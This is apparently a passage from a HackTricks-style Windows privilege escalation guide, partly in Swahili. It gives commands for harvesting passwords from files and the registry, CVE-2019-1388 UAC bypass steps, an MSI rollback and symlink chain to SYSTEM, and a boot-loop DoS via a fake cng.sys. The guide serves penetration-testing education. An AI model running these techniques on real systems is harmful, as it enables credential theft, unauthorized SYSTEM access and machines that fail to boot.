**Component Object Model (COM)** ni teknolojia iliyo jengewa ndani ya mfumo wa uendeshaji wa Windows inayoruhusu mawasiliano kati ya vipengele vya programu vinavyotengenezwa kwa lugha tofauti. Kila sehemu ya COM inatambulishwa kupitia class ID (CLSID) na kila sehemu inaonyesha utendaji kupitia interface(s), zinazoainishwa kwa interface ID (IIDs).

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za rejista hii unaweza kupata rejista ndogo **InProcServer32** ambayo ina **default value** inayorejelea DLL na thamani inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) au **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Kwa msingi, ikiwa utaweza **overwrite any of the DLLs** zitakazotekelezwa, unaweza **escalate privileges** ikiwa DLL hiyo itatekelezwa na mtumiaji mwingine.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa nywila kwa ujumla katika faili na rejista**

**Tafuta yaliyomo ndani ya faili**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili lenye jina fulani**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta rejista kwa majina ya funguo na nywila**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Zana zinazotafuta passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin niliyoitengeneza ili **automatically execute every metasploit POST module that searches for credentials** ndani ya victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zenye passwords zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa password kutoka kwa mfumo.

Zana [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) inatafuta **sessions**, **usernames** na **passwords** za zana mbalimbali zinazohifadhi data hii kwa clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Fikiria kwamba **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Kisha, ikiwa una **full access to the low privileged process**, unaweza kunyakua **open handle to the privileged process created** with `OpenProcess()` na **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, enable process communication and data transfer.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Kutambua **privileged process** inayowasiliana kupitia pipe unayoweza kuiga kunatoa nafasi ya **gain higher privileges** kwa kuchukua utambulisho wa mchakato huo mara inapoingiliana na pipe uliyoiweka. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Pia zana zifuatazo zinawezesha **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). Mteja wa mbali aliyethibitishwa anaweza abuse the mailslot-based async event path ili kugeuza `ClientAttach` kuwa arbitrary **4-byte write** kwa faili yoyote iliyopo inayoweza kuandikwa na `NETWORK SERVICE`, kisha kupata Telephony admin rights na load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Iwapo una ufikiaji wa kiolesura cha picha (via console or RDP) na UAC imewezeshwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote such as "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na ruhusa.

Hii inafanya iwezekane kuinua privileges na bypass UAC wakati mmoja kwa udhaifu uleule. Zaidi ya hayo, hakuna haja ya kusakinisha chochote na binary inayotumika wakati wa mchakato huo, ime signed na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathirika ni ifuatayo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Ili kutumia udhaifu huu, ni lazima ufanye hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Soma hili ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hili ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Mbinu iliyoelezewa [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) pamoja na exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Shambulio hii kwa kifupi inahusisha kutumiwa kwa rollback feature ya Windows Installer kubadilisha faili halali na zile zenye madhara wakati wa mchakato wa uninstallation. Kwa hili mshambuliaji anahitaji kuunda **malicious MSI installer** itakayotumika ku-hijack `C:\Config.Msi` folder, ambayo baadaye Windows Installer itatumia kuhifadhi rollback files wakati wa uninstallation ya vifurushi vingine vya MSI ambapo faili za rollback zingekuwa zimebadilishwa kuwa na payload ya uharibu.

Mbinu iliyofupishwa ni ifuatayo:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> Katika hatua hii, **trigger the SYSTEM-level arbitrary folder delete vulnerability** ili kufuta `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Mbinu kuu ya MSI rollback (ile iliyotangulia) inadhani unaweza kufuta **entire folder** (mfano, `C:\Config.Msi`). Lakini je udhaifu wako unaruhusu tu **arbitrary file deletion**?

Unaweza kutumia **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Mtiririko huu unahifadhi **metadata ya index** ya kabrasha.

Hivyo, ukifuta **mtiririko `::$INDEX_ALLOCATION`** wa kabrasha, NTFS **huondoa kabrasha lote** kutoka kwenye mfumo wa faili.

Unaweza kufanya hivyo kwa kutumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Ingawa unamwita API ya kufuta *faili*, inafuta **folda yenyewe**.

### Kutoka Folder Contents Delete hadi SYSTEM EoP
Je, vipi ikiwa primitive yako haitakuwezesha kufuta faili/folda yoyote, lakini **inaruhusu kufuta *yaliyomo* ya folda inayodhibitiwa na mshambuliaji**?

1. Hatua 1: Andaa folda ya mtego na faili
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua 2: Weka **oplock** kwenye `file1.txt`
- Oplock **inasitisha utekelezaji** wakati mchakato wenye vibali unajaribu kufuta `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Hatua 3: Chochea mchakato wa SYSTEM (kwa mfano, `SilentCleanup`)
- Mchakato huu huskagua folda (mfano, `%TEMP%`) na kujaribu kufuta yaliyomo ndani yake.
- Itakapofika `file1.txt`, **oplock triggers** na inampa callback yako udhibiti.

4. Hatua 4: Ndani ya callback ya oplock – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
- Hii inafanya `folder1` kuwa tupu bila kuvunja oplock.
- Usifute `file1.txt` moja kwa moja — hilo litasababisha kuachiliwa kwa oplock mapema.

- Chaguo B: Geuza `folder1` kuwa **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Hii inalenga mto wa ndani wa NTFS unaohifadhi metadata ya folda — kufuta mto huo kunafuta folda.

5. Hatua 5: Waachilia oplock
- Mchakato wa SYSTEM unaendelea na unajaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli inafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka Arbitrary Folder Create hadi DoS ya Kudumu

Tumia primitive inayokuruhusu **create an arbitrary folder as SYSTEM/admin** — hata kama **you can’t write files** au **set weak permissions**.

Unda **folder** (si **file**) lenye jina la **critical Windows driver**, kwa mfano:
```
C:\Windows\System32\cng.sys
```
- Njia hii kwa kawaida inalingana na driver ya kernel-mode `cng.sys`.
- Ikiwa uta**iunda kabla kama saraka**, Windows itashindwa kupakia dereva halisi wakati wa kuanzisha.
- Kisha, Windows inajaribu kupakia `cng.sys` wakati wa kuanzisha.
- Inapoiona saraka, **inashindwa kutambua dereva halisi**, na **inaanguka au kusimamisha kuanzisha mfumo**.
- Hakuna **njia mbadala**, na hakuna **urejeshaji** bila uingiliaji wa nje (mfano, ukarabati wa boot au upatikanaji wa diski).

### Kutoka kwa privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

When a **privileged service** writes logs/exports to a path read from a **writable config**, redirect that path with **Object Manager symlinks + NTFS mount points** to turn the privileged write into an arbitrary overwrite (even **without** SeCreateSymbolicLinkPrivilege).

**Mahitaji**
- Mipangilio inayohifadhi njia lengwa inaweza kuandikwa na mshambulizi (mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda a mount point kwa `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Operesheni yenye ruhusa inayoandika kwenye njia hiyo (log, export, report).

**Mfano wa mnyororo**
1. Soma config ili kupata marudio ya log yenye ruhusa, kwa mfano `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` katika `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza njia hiyo bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri sehemu yenye ruhusa ya juu kuandika logi (kwa mfano, msimamizi anachochea "tuma SMS ya jaribio"). Uandishi sasa unawekwa katika `C:\Windows\System32\cng.sys`.
4. Inspect the overwritten target (hex/PE parser) to confirm corruption; reboot forces Windows to load the tampered driver path → **boot loop DoS**. Hii pia inaenea kwa faili yoyote iliyolindwa ambayo huduma yenye ruhusa itafungua kwa kuandika.

> `cng.sys` is normally loaded from `C:\Windows\System32\drivers\cng.sys`, but if a copy exists in `C:\Windows\System32\cng.sys` it can be attempted first, making it a reliable DoS sink for corrupt data.



## **Kutoka High Integrity hadi System**

### **Huduma mpya**

Ikiwa tayari unaendesha kwenye mchakato wa High Integrity, **njia ya kwenda SYSTEM** inaweza kuwa rahisi kwa **kuunda na kuendesha huduma mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wakati unaunda service binary hakikisha ni service halali au kwamba binary inafanya hatua muhimu haraka kwani itauawa ndani ya 20s ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye High Integrity process unaweza kujaribu **kuwezesha AlwaysInstallElevated registry entries** na **kufunga** reverse shell ukitumia _**.msi**_ wrapper.\
[Taarifa zaidi kuhusu registry keys zinazohusika na jinsi ya kufunga kifurushi cha _.msi_ ipo hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una token privileges hizo (pengine utazipata katika tayari High Integrity process), utaweza **kufungua karibu process yoyote** (sio protected processes) kwa kutumia SeDebug privilege, **kunakili token** ya process, na kuunda **process yoyote kwa token hiyo**.\
Kwa kawaida huwachagua process yoyote inayokimbia kama SYSTEM yenye token privileges zote (_ndio, unaweza kupata SYSTEM processes bila token privileges zote_).\
**Unaweza kupata** [**mfano wa code unaotekeleza teknikhi iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Teknikhi hii inatumika na meterpreter kuongeza cheo katika `getsystem`. Teknikhi inahusisha **kuunda pipe kisha kuunda/kunyanyasa service ili kuandika kwenye pipe hiyo**. Kisha, **server** aliyeyunda pipe kwa kutumia **`SeImpersonate`** privilege ataweza **kuiga token** ya pipe client (service) akipata SYSTEM privileges.\
Ikiwa unataka [**kujifunza zaidi kuhusu name pipes unapaswa kusoma hili**](#named-pipe-client-impersonation).\
Ikiwa unataka kusoma mfano wa [**jinsi ya kutoka high integrity hadi System kwa kutumia name pipes soma hapa**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ikiwa utafanikiwa **hijack a dll** inayopakiwa na **process** inayokimbia kama **SYSTEM** utaweza kutekeleza code yoyote kwa ruhusa hizo. Kwa hivyo Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation, na zaidi, ni **rahisi zaidi kufikiwa kutoka high integrity process** kwani itakuwa na **write permissions** kwenye folda zinazotumika kupakia dlls.\
**Unaweza** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Vifaa muhimu

**Zana bora ya kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Angalia misconfigurations na faili nyeti (**[**tazama hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imetambuliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Angalia baadhi ya misconfigurations zinazowezekana na kukusanya info (**[**tazama hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Angalia misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za vikao vilivyohifadhiwa vya PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwa local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa nywila kutoka Credential Manager. Imetambuliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Piga passwords zilizokusanywa kwenye domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni PowerShell ADIDNS/LLMNR/mDNS spoofer na zana ya man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Uorodhesho wa msingi wa privesc Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Tafuta privesc vulnerabilities zinazojulikana (DEPRECATED kwa Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa local **(Inahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Tafuta privesc vulnerabilities zinazojulikana (inahitaji kujengwa kwa kutumia VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Inafanyia host enumeration kutafuta misconfigurations (zaidi ni zana ya kukusanya info kuliko privesc) (inahitaji kujengwa) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwa softwares nyingi (exe iliyotanguliwa kwenye github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwa C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Angalia misconfiguration (executable precompiled kwenye github). Haipendekezwi. Hailandi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Angalia misconfigurations zinazowezekana (exe kutoka python). Haipendekezwi. Hailandi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyotengenezwa kwa msingi wa chapisho hili (haiitaji accesschk ili ifanye kazi ipasavyo lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Inasoma output ya **systeminfo** na kupendekeza exploits zinazofanya kazi (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Inasoma output ya **systeminfo** na kupendekeza exploits zinazofanya kazi (python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unahitaji kujenga project kwa kutumia toleo sahihi la .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililowekwa kwenye host ya mhusika unaweza kufanya:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeo

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
